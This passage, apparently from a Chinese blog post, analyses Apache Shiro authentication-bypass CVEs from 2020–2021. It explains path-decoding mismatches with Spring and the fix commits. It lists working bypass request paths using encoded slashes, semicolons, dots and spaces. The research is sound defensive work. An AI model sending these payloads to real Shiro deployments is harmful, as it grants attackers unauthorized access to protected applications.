之类的配置，匹配路径下的全部访问请求，包括子目录及后面的请求，如：<code>/admin/**</code> 可以匹配 <code>/admin/list</code> 以及 <code>/admin/get/id/2</code> 等请求。</p><p>另外一个类似的配置是 <code>/*</code> ，单个 <code>*</code> 不能跨目录，只能在两个 <code>/</code> 之间匹配任意数量的字符，如 <code>/admin/*</code> 可以匹配 <code>/admin/list</code> 但是不能匹配 <code>/admin/get/id/2</code>。</p><p>Shiro 对于 Ant 风格路径表达式解析的支持位于 <code>AntPathMatcher#doMatch</code> 方法中，这里简单说一下其中的逻辑：</p><p>首先判断配置的表达式 pattern 和访问路径 path 起始是否均为 <code>/</code> 或均不是，如果不同则直接返回 false。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642996128791.png" alt="img"></p><p>然后将 pattern 和 path 均切分为 String 类型的数组。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642996235532.png" alt="img"></p><p>然后开始循环判断 pattern 和 path 对应位置的配置和路径是否有匹配，判断使用 <code>AntPathMatcher#matchStrings</code> 方法。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642996454160.png" alt="img"></p><p><code>AntPathMatcher#matchStrings</code> 方法又把字符拆分成 char 数组，来进行匹配尝试，并支持 <code>*</code> 以及 <code>?</code> 类型的通配符的匹配。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1642996917256.png" alt="img"></p><p>本次漏洞涉及到的配置则是使用 <code>*</code> 配置。再再次重温一下 shiro 的处理逻辑：</p><p><code>WebUtils#getRequestUri</code> 方法使用 <code>request.getContextPath()/request.getServletPath()/request.getPathInfo()</code> 获取用户请求路径，然后调用 <code>decodeAndCleanUriString</code> 方法解码并取出 <code>;</code> 之后的内容，然后调用 normalize 标准化路径。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643002359360.png" alt="img"></p><p><code>decodeAndCleanUriString</code> 方法逻辑之前贴过，这里再贴一次。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643002184283.png" alt="img"></p><p>而漏洞就出在此逻辑处，各位看官集中注意力，我来描述一下：</p><ul><li>以前的 shiro 使用 <code>request.getRequestURI()</code> 获取用户请求路径，并自行处理，此时 shiro 默认Servlet 容器（中间件）不会对路径进行 URL 解码操作，通过其注释可以看到；<br><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643003287277.png" alt="img"></li><li>在 1.5.2 版本的 shiro 更新中，为了修复 CVE-2020-1957 ，将 <code>request.getRequestURI()</code> 置换为了 <code>valueOrEmpty(request.getContextPath()) + &quot;/&quot; + valueOrEmpty(request.getServletPath()) + valueOrEmpty(request.getPathInfo());</code>，而对于 <code>request.getContextPath()</code> 以及 <code>request.getPathInfo()</code>，以 Tomcat 为例的中间件是会对其进行 URL 解码操作的，此时 shiro 再进行 <code>decodeAndCleanUriString</code>，就相当于进行了两次的 URL 解码，而与之后的 Spring 的相关处理产生了差异。</li></ul><p>这其中细节，可以查看 mi1k7ea 师傅发表在先知上的<a href="https://xz.aliyun.com/t/7544">文章</a>，我这里截取其中的一小段。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643003877308.png" alt="img"></p><p>至此已经发现了 shiro 中的路径处理差异问题，由于 shiro 会二次解码路径，因此 <code>%25%32%66</code> 将会被 shiro 解码为 <code>/</code>，而如果只解码一次， <code>%25%32%66</code> 只会被处理成 <code>%2f</code>。</p><p>此时如果使用了单个 &quot;*&quot; 的通配符，将产生差异化问题，例如如下配置，配置了 <code>/audit/*</code>：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643004321211.png" alt="img"></p><p>此时访问 <code>/audit/list</code>，<code>/audit/aaa</code> 之类的请求，都会被 shiro 拦截，需要进行权限校验。</p><p>但是如果访问 <code>/audit/aa%25%32%66a</code>，在 shiro 处理时，会将其处理为 <code>/audit/aa/a</code>，此路径并不能被 <code>/audit/*</code> 配置项匹配到，因此会绕过 shiro 校验。而在后续 spring 逻辑中会处理成 <code>/audit/aa%2fa</code>，可能会绕过请求。</p><p>找到了差异点，接下来就要找场景了，Ruil1n 师傅找到了当 Spring 在参数中使用 <code>PathVariable</code> 注解从 RequestMapping 中的占位符中取数据的场景，可以满足上面的情况，如下图：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643007755058.png" alt="img"></p><p>漏洞复现如下，正常访问：<code>/audit/aaaa</code> 会跳转至登录页面：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643009508411.png" alt="img"></p><p>使用 <code>%25%32%66</code> 绕过，可以发现绕过：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643009611555.png" alt="img"></p><p>这里还有一个限制，由 PathVariable 注解的参数只能是 String 类型，如果是其他类型的参数，将会由于类型不匹配而无法找到对应的处理方法。</p><h4 id="ContextPath-绕过"><a href="#ContextPath-绕过" class="headerlink" title="ContextPath 绕过"></a>ContextPath 绕过</h4><p>这个绕过实际上是对上一个 CVE 思路上的延伸，在 CVE-2020-1957 中，借助了 shiro 和 spring 在获取 requestURI 时对 <code>;</code> 的处理差异，以及 <code>/../</code> 在路径标准化中的应用，进行了权限绕过。</p><p>而这次的绕过，则是在 ContextPath 之前使用 <code>/;/</code> 来绕过，访问如：<code>/;/spring/admin/aaa</code> 路径，根据已经了解到的知识：</p><ul><li>shiro 会截取掉 <code>;</code> 之后的路径，按照 <code>/</code> 来匹配；</li><li>spring 会把路径标准化为 <code>/spring/admin/aaa</code> 来匹配。</li></ul><p>这就产生了 shiro 鉴权的路径和 spring 处理的路径不同造成的绕过。</p><p>淚笑提供了他的<a href="https://github.com/l3yx/springboot-shiro">漏洞环境</a>。复现如下：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643016729873.png" alt="img"></p><p>同样，上面这个 payload 只能在较低版本的 Spring Boot 上使用，原因与之前提到过的一致。</p><h3 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a href="https://github.com/apache/shiro/commit/01887f645f92d276bbaf7dc644ad28ed4e82ef02">Commit-01887f6</a> 中提交了针对上述两个绕过的更新。</p><p>首先 shiro 回退了 <code>WebUtils#getRequestUri</code> 的代码，并将其标记为 <code>@Deprecated</code>。并建议使用 <code>getPathWithinApplication()</code> 方法获取路径减去上下文路径，或直接调用 <code>HttpServletRequest.getRequestURI()</code> 方法获取。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643018792706.png" alt="img"></p><p>其次是在 <code>WebUtils#getPathWithinApplication</code> 方法，修改了使用 RequestUri 去除 ContextPath 的减法思路，改为使用 servletPath + pathInfo 的加法思路。加法过后使用 <code>removeSemicolon</code> 方法处理分号，<code>normalize</code> 方法标准化路径。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643019122710.png" alt="img"></p><p><code>getServletPath</code> 和 <code>getPathInfo</code> 方法逻辑如下：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643019260964.png" alt="img"></p><p>更新后，shiro 不再处理 contextPath，不会导致绕过，同时也避免了二次 URL 解码的问题。</p><h2 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h2><h3 id="漏洞信息-7"><a href="#漏洞信息-7" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13933">CVE-2020-13933</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-46579">CNVD-2020-46579</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro &lt; 1.6.0</td></tr><tr><td align="left">漏洞描述</td><td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td></tr><tr><td align="left">漏洞关键字</td><td align="left">Spring | 顺序 | %3b | 绕过</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d">Commit-dc194fc</a></td></tr><tr><td align="left">相关链接</td><td align="left"><a href="https://xz.aliyun.com/t/8223">https://xz.aliyun.com/t/8223</a></td></tr></tbody></table><h3 id="漏洞详解-6"><a href="#漏洞详解-6" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>这个 CVE 实际上是对上一个 CVE 中 AntPathMatcher 绕过方式的再次绕过。</p><p>在上一个 CVE 的修复补丁中提到，Shiro 使用了 servletPath + pathInfo 的加法思路获取访问 URI。获取两者值的方法均为从 attribute 中获得对应的值，如果为空则调用 <code>request.getXX</code> 对应的方法进行获取，加法过后使用 <code>removeSemicolon</code> 方法处理分号，<code>normalize</code> 方法标准化路径。之前也提到过，<code>request.getXX</code> 方法，会进行 URL 解码操作。</p><p>这里需要注意的是处理顺序的问题，按照上述逻辑，shiro 对于路径的处理，会先 URL 解码，再处理分号，然后标准化路径。</p><p>这个顺序将会与 Spring 及 Tomcat 产生差异，之前提到过，在 <code>UrlPathHelper#decodeAndCleanUriString</code> 方法中，是后两者是先处理分号，再 URL 解码，然后标准化路径。</p><p>这一差异将会导致，当请求中出现了 <code>;</code> 的 URL 编码 <code>%3b</code> 时，处理顺序的不同将会带来结果不同导致绕过：</p><ul><li>shiro 会 url 解码成 <code>;</code>，然后截断后面的内容，进行匹配，例如 <code>/audit/aaa%3baaa</code> -&gt; <code>/audit/aaa</code>。</li><li>spring &amp; tomcat 会处理成 <code>/audit/aaa;aaa</code>。</li></ul><p>两者处理后的结果不同，就造成了绕过。差异点找到了，接下来就是场景，也同样依赖 <code>PathVariable</code> 注解 String 类型的参数。</p><p>这里有一个点是，对于使用了 <code>/audit/*</code> 配置的鉴权，无法是匹配 <code>/audit/</code> 的。</p><p>因此，对于配置了 <code>/audit/*</code> 的鉴权，可以使用 <code>/audit/%3baaa</code> 来使 shiro 处理成 <code>/audit/</code>，并结合在 spring 中 PathVariable 的场景即可实现绕过。</p><p>漏洞复现如下：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643036234269.png" alt="img"></p><h3 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>本次漏洞修复位于 <a href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d">Commit-dc194fc</a> 中，在这此更新中，shiro 没有改动现有的处理逻辑，而是选择了使用全局过滤和处理的方式。</p><p>Shiro 创建了一个 global 的 filter：<code>InvalidRequestFilter</code>，这个类继承了 <code>AccessControlFilter</code>。用来过滤和阻断有危害的请求，会返回 400 状态码，其中包括：</p><ul><li>带有分号的请求；</li><li>带有反斜线的请求；</li><li>非 ASCII 字符。</li></ul><p>这个类是根据 spring-security 中的 <a href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/web/firewall/StrictHttpFirewall.html">StrictHttpFirewall</a> 类编写而来。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643077038950.png" alt="img"></p><p>其中关键的 <code>isAccessAllowed</code> 方法会进行逐个校验。</p><p>shiro 将 <code>InvalidRequestFilter</code> 配置在 Global Filter 中。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643078412941.png" alt="img"></p><p>并使其默认匹配 &quot;/**&quot;，使其可以全局匹配进行过滤校验。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643079290890.png" alt="img"></p><h2 id="CVE-2020-17510"><a href="#CVE-2020-17510" class="headerlink" title="CVE-2020-17510"></a>CVE-2020-17510</h2><h3 id="漏洞信息-8"><a href="#漏洞信息-8" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17510">CVE-2020-17510</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-60318">CNVD-2020-60318</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro &lt; 1.7.0</td></tr><tr><td align="left">漏洞描述</td><td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td></tr><tr><td align="left">漏洞关键字</td><td align="left">Spring | 编码 | %2e | 绕过 | /%2e%2e/</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403">Commit-6acaaee</a></td></tr><tr><td align="left">相关链接</td><td align="left"><a href="https://lists.apache.org/thread/12bn9ysx6ogm830stywro4pkoq8dxzfk">https://lists.apache.org/thread/12bn9ysx6ogm830stywro4pkoq8dxzfk</a></td></tr></tbody></table><h3 id="漏洞详解-7"><a href="#漏洞详解-7" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>本漏洞还是对 AntPathMatcher 的继续绕过。之前已经尝试了 <code>;</code> 的 URL 编码，<code>/</code> 的双重 URL 编码的绕过，都是因为 Shiro 先 url 解码再标准化和处理的逻辑与 Spring 不同导致的。</p><p>那还有什么字符的 URL 编码可能导致问题呢？常见的 URL 中还有什么字符能用呢？答案就是 <code>.</code>，<code>.</code> 的 URL 编码为 <code>%2e</code>。</p><p>当一个 <code>%2e</code> 出现在请求中时，会发生什么事呢？很显然，shiro 会将其当做 <code>.</code> 处理，而 Spring 会将其当做字符 <code>%2e</code> 处理。</p><p>此时如果 <code>%2e</code> 出现的位置正确，就可以在 shiro 处理后消失，造成差异，例如访问：&quot;/audit/%2e/&quot;：</p><ul><li>Shiro url decode：&quot;/audit/./&quot;</li><li>Shiro 标准化路径：&quot;/audit/&quot;</li><li>Spring 标准化路径：&quot;/audit/%2e/&quot;</li><li>Spring url decode：&quot;/audit/.&quot;</li></ul><p>由此可见，Shiro 匹配的路径和 Spring 匹配的路径相差了一个字符 &quot;.&quot;，将造成绕过。此时依旧借助单个 &quot;*&quot; 的通配符以及 <code>PathVariable</code> 注解 String 类型的参数的场景触发漏洞。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643104107679.png" alt="img"></p><p>可以使用的 payload 包括：</p><ul><li><code>/%2e</code></li><li><code>/%2e/</code></li><li><code>/%2e%2e</code></li><li><code>/%2e%2e/</code></li></ul><p>因为上面的写法都会被 shiro 的标准化路径处理掉，并且同时能被 <code>PathVariable</code> 注解 String 类型的参数匹配到。</p><h3 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403">Commit-6acaaee</a> 中提交了本次漏洞的修复。</p><p>在本次修复中可以看到，Shiro 的思路再次转变，不再按照 Spring 和 Tomcat 改自己的处理代码，也不再给自己加代码来适配 Spring，而是创建了 UrlPathHelper 的子类 ShiroUrlPathHelper，并重写了 <code>getPathWithinApplication</code> 和 <code>getPathWithinServletMapping</code> 两个方法，全部使用 Shiro 自己的逻辑 <code>WebUtils#getPathWithinApplication</code> 进行返回。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643097638169.png" alt="img"></p><p>在之前的分析中我们知道，Spring 与 Shiro 处理逻辑之间的差异就在这个位置，而现在 Shiro 直接把代码逻辑重写，通过注入自己的代码来修改 Spring 的相关逻辑，用来保证二者没有差异。究竟是怎么注入的呢？在配置类中 import 了 <code>ShiroRequestMappingConfig</code> 类。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643097999114.png" alt="img"></p><p><code>ShiroRequestMappingConfig</code> 类会向 <code>RequestMappingHandlerMapping#urlPathHelper</code> 设置为 <code>ShiroUrlPathHelper</code>。</p><p><img src="https://su18.org/post-images/1643098610269.png" alt="img"></p><p>设置后，Spring 匹配 handler 时获取路径的逻辑就会使用 Shiro 提供的逻辑，保持了二者逻辑的一致。从而避免了绕过的情况。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>这里需要注意的是，Shiro 官方对这个漏洞的修复非常坑，根据官方给出的<a href="https://lists.apache.org/thread/12bn9ysx6ogm830stywro4pkoq8dxzfk">信息</a>，Shiro 将修复放在了 <code>shiro-spring-boot-web-starter</code> 包中，也就是使用了 <code>shiro-spring-boot-web-starter</code> 进行配置的项目，升级版本才会使防御代码生效，才会注入 ShiroUrlPathHelper 。</p><p>如果你没有使用<code>shiro-spring-boot-web-starter</code> 自动配置，而是引入 <code>shiro-spring</code> 自己进行注入 Bean，单纯的升级版本是无法防御本次 CVE 的，需要：</p><ol><li>根据<a href="https://github.com/apache/shiro/blob/shiro-root-1.7.0/support/spring/src/main/java/org/apache/shiro/spring/web/config/ShiroRequestMappingConfig.java#L28-L30">这个链接</a>中的代码来进行手动配置；</li><li>或根据<a href="https://shiro.apache.org/spring-framework.html#SpringFramework-WebConfig">这个链接</a>将 <code>ShiroRequestMappingConfig</code> 添加在 auto configuration 配置中。</li></ol><p>如果不配置，将无法有效防御此 CVE。</p><h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>这个修复在当时来看，如果配置正确，防御能力是 OK 的，整个思路都没问题，但是随着 Spring 自身代码的迭代，却又将安全问题暴露了出来。在高版本的 Spring 中，由于 <code>alwaysUseFullPath</code> 默认为 true ，导致应用程序使用 <code>UrlPathHelper.defaultInstance</code> 来处理，而不是 Shiro 实现的 <code>ShiroUrlPathHelper</code> 来处理。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643096936792.png" alt="img"></p><p>这样就导致这个修复补丁又被完美的绕过了。</p><p><img src="https://su18.org/post-images/1643097189106.png" alt="img"></p><h2 id="CVE-2020-17523"><a href="#CVE-2020-17523" class="headerlink" title="CVE-2020-17523"></a>CVE-2020-17523</h2><h3 id="漏洞信息-9"><a href="#漏洞信息-9" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17523">CVE-2020-17523</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-09492">CNVD-2021-09492</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro &lt; 1.7.1</td></tr><tr><td align="left">漏洞描述</td><td align="left">Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</td></tr><tr><td align="left">漏洞关键字</td><td align="left">Spring | trim | %20 | 绕过 | /%20%20/</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/ab1ea4a2006f6bd6a2b5f72740b7135662f8f160">Commit-ab1ea4a</a></td></tr><tr><td align="left">相关链接</td><td align="left"><a href="https://www.anquanke.com/post/id/230935">https://www.anquanke.com/post/id/230935</a> <a href="https://www.eso.org/~ndelmott/url_encode.html">https://www.eso.org/~ndelmott/url_encode.html</a></td></tr></tbody></table><h3 id="漏洞详解-8"><a href="#漏洞详解-8" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>继续绕过...</p><p>在使用 <code>.</code> 、<code>/</code> 、<code>;</code> 的 URL 编码绕过之后，这次使用的是空格的 URL 编码：<code>%20</code>。</p><p>之前讲过，在匹配访问路径与配置鉴权路径时，在 <code>AntPathMatcher#doMatch</code> 方法中，首先会调用 <code>org.apache.shiro.util.StringUtils#tokenizeToStringArray</code> 方法将 pattern 以及 path 处理成 String 数组，再进行比对。</p><p><img src="https://su18.org/post-images/1643108121514.png" alt="img"></p><p>这个方法会继续调用有四个参数的重写方法，并且后两个参数的值均为 true。其实这部分也是抄的 spring 的代码。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643108220835.png" alt="img"></p><p>可以看到后两个布尔类型参数的意义是对 StringTokenizer 结果的处理的标志 flag，代表是否对 token 进行 trim 操作，以及是否忽略空的 token。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643108468671.png" alt="img"></p><p>因此，在被 <code>WebUtils#getPathWithinApplication</code> 方法处理过的 URI，再与配置路径匹配时，又会处理空格。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643108941676.png" alt="img"></p><p>因此对于 &quot;/audit/%20&quot; 这种访问，可以理解为会被 shiro 处理成 &quot;/audit/&quot; 这种格式去匹配。</p><p>而 Spring 的处理逻辑，在配置了 CVE-2020-17510 的安全补丁后，虽然与 shiro 保持了一致，但是在匹配 handler 时并没有空格的处理，因此可以继续以字符串的方式匹配。</p><p>依旧是依赖单个 &quot;*&quot; 的通配符以及 <code>PathVariable</code> 注解 String 类型的参数的场景触发漏洞。复现如下，<code>%20</code> 随便加。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643109660920.png" alt="img"></p><p>由于之前的安全修复，URL 中的非 ASCII 字符会被 filter 干掉，因此，我 FUZZ 了<br>%00-ff 的全部字符，发现只有 %20 能用。<br><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643167384780.png" alt="img"></p><h3 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a href="https://github.com/apache/shiro/commit/ab1ea4a2006f6bd6a2b5f72740b7135662f8f160">Commit-ab1ea4a</a> 中提交了本次漏洞的修复。</p><p>可以看到是指定了 <code>StringUtils#tokenizeToStringArray</code> 方法的第三个参数 trimTokens 为 false，也就是说不再去除空格，从而消除了本次漏洞的影响。</p><p><img src="https://su18.org/post-images/1643108044903.png" alt="img"></p><p>其实即使不报安全漏洞， shiro 也应该修复这个逻辑，因为 spring 本身可以支持以空格作为 RequestMapping。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643111008009.png" alt="img"></p><p>而 shiro 对其处理逻辑则有问题，配置后访问将不生效。</p><p><img src="https://su18.org/post-images/1643111002243.png" alt="img"></p><p>如下：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643110977704.png" alt="img"></p><h2 id="CVE-2021-41303"><a href="#CVE-2021-41303" class="headerlink" title="CVE-2021-41303"></a>CVE-2021-41303</h2><h3 id="漏洞信息-10"><a href="#漏洞信息-10" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41303">CVE-2021-41303</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-825">SHIRO-825</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro &lt; 1.8.0</td></tr><tr><td align="left">漏洞描述</td><td align="left">Apache Shiro 与 Spring Boot 一起使用时，远程攻击者可以发送特制的 HTTP 请求， 绕过身份验证过程并获得对应用程序的未授权访问。</td></tr><tr><td align="left">漏洞关键字</td><td align="left">Spring | 回退 | /aaa/*/ | 绕过</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a></td></tr><tr><td align="left">相关链接</td><td align="left">[<a href="https://threedr3am.github.io/]">https://threedr3am.github.io/]</a>(<a href="https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro">https://threedr3am.github.io/2021/09/22/从源码diff分析Apache-Shiro</a> 1.7.1版本的auth bypass（CVE-2021-41303）/)</td></tr></tbody></table><h3 id="漏洞详解-9"><a href="#漏洞详解-9" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>在上一个版本的更新中，除了安全修复，还更新了几个逻辑，来优化对路径末尾 &quot;/&quot; 的情况的处理。</p><p>第一是匹配路径的方法 <code>PathMatchingFilter#pathsMatch</code>，在曾经 SHIRO-682 的更新中针对这个方法进行了修改，为了兼容 Spring 对访问路径最后一个 &quot;/&quot; 的支持。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643172673662.png" alt="img"></p><p>在本次版本更新中，添加了一层判断逻辑，即先使用原始请求判断，如果没有匹配成功，再使用去掉 &quot;/&quot; 的路径尝试匹配。</p><p>第二是在 <code>PathMatchingFilterChainResolver</code> 中新增了一个 <code>removeTrailingSlash</code> 方法，用来去除请求路径中的最后的 &quot;/&quot;。</p><p><img src="https://su18.org/post-images/1643174895873.png" alt="img"></p><p>并在 <code>getChain</code> 方法中更改逻辑，依旧是先使用原来的请求匹配，匹配不到再使用去除请求路径之后的 &quot;/&quot; 来匹配。</p><p><img src="https://su18.org/post-images/1643174983680.png" alt="img"></p><p>原本的逻辑是，拿到 URI ，直接判断最后是不是 “/”，如果是直接去掉，然后匹配和处理，但改过之后，直接拿过来匹配，如果没匹配到，再尝试去掉 “/” 在匹配，这种情况下，对于带 “/” 的请求将会匹配两次。</p><p>不但逻辑复杂了，而且还写出了 BUG。在 else 语句块中，没有将 pathPattern 给到 <code>filterChainManager#proxy</code> 方法，反而是将用户可控的 requestURINoTrailingSlash 给了进去。</p><p>这为什么会产生漏洞呢？这一切先从一个 BUG 说起：SHIRO-825。首先来复现一下这个 ISSUES ，我们配置如下，同样是使用单个 &quot;*&quot; 匹配:</p><pre class="language-java" data-language="java"><code class="language-java">chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;list&quot;, &quot;authc&quot;);chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;*&quot;, &quot;anon&quot;);</code></pre><p>可以看到，<code>/audit/</code> 路径下只有 list 是需要鉴权的，其他不需要。Controller 代码如下：</p><pre class="language-java" data-language="java"><code class="language-java">@Controller@RequestMapping(value &#x3D; &quot;&#x2F;audit&quot;)public class AuditController &#123;@GetMapping(value &#x3D; &quot;&#x2F;list&quot;)public void list(HttpServletResponse response) throws IOException &#123;response.getWriter().println(&quot;you have to be auditor to view this page&quot;);&#125;@GetMapping(value &#x3D; &quot;&#x2F;&#123;name&#125;&quot;)public void list(@PathVariable String name, HttpServletResponse response) throws IOException &#123;response.getWriter().println(&quot;no need auth to see this page:&quot; + name);&#125;&#125;</code></pre><p>此时访问 &quot;/audit/aaa&quot; 正常：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643179339365.png" alt="img"></p><p>但是访问 &quot;/audit/aaa/&quot; 报错：</p><p><img src="https://su18.org/post-images/1643179406759.png" alt="img"></p><p>原因就是，shiro 会用处理过的用户请求路径去配置文件里找对应的路径，自然找不到就抛异常的。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643179722258.png" alt="img"></p><p>那这个 BUG 是如何延伸成为漏洞的呢？不难想到，如果 shiro 在配置文件中找到了这个路径，那逻辑就正常了。我们再来配置一下场景，现在改为如下配置：</p><pre class="language-java" data-language="java"><code class="language-java">chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;*&quot;, &quot;authc&quot;);chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;list&quot;, &quot;anon&quot;);</code></pre><p>现在的逻辑是，配置了 <code>/audit/*</code> 需要认证，而 <code>/audit/list</code> 不需要认证，注意配置的顺序，正常逻辑下，对于 <code>/audit/list</code> 对应的路径，是需要鉴权的，因为他会被 <code>/audit/*</code> 匹配到，但是 <code>/audit/*</code> 不能匹配 <code>/audit/list/</code>，会去掉 &quot;/&quot; 进行匹配，能匹配到，且在后续的逻辑中也可以找到对应的路径，就可以绕过鉴权。</p><p><img src="https://su18.org/post-images/1643181257015.png" alt="img"></p><h3 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a> 中修复了此问题。可以看到修改后正确的传入了 pathPattern。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1643176045349.png" alt="img"></p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>本漏洞的分析是参考了 threedr3am 师傅的博客，但存在几个疑问：</p><ul><li>本 CVE 在 CVSS 3.0 获得了 9.8 的评分，CVSS 2.0 获得了 7.5 的评分，但上面的漏洞场景似乎限制很大，给不到高危。</li><li>ISSUES 的报送者是报送 